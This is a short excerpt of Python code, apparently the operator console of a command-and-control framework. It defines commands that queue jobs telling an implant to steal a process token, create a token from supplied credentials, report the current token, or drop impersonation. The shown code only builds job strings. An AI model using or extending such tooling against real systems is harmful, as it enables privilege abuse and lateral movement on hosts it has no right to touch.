...
class TokenCommands(CommandSet):
    ...
    def do_rev2self(self, _: Statement):
        ...
        self.post_job(f'"name":"rev2self","description":"drop impersonated token","arguments":"","type":1')

    def do_get_token(self, _: Statement):
        """ Retrieve the identity of the impersonated token. """
        self.post_job(f'"name":"get_token","description":"return current impersonated token","arguments":"","type":1')
    ...
    def do_make_token(self, args: argparse.Namespace):
        ...
        self.post_job(f'"name":"make_token","description":"create a token","arguments":"{domain_b64},{user_b64},{password_b64}","type":1')
    ...
    def do_steal_token(self, args: argparse.Namespace):
        ...
        self.post_job(f'"name":"steal_token","description":"steal a token","arguments":"{pid_b64}","type":1')
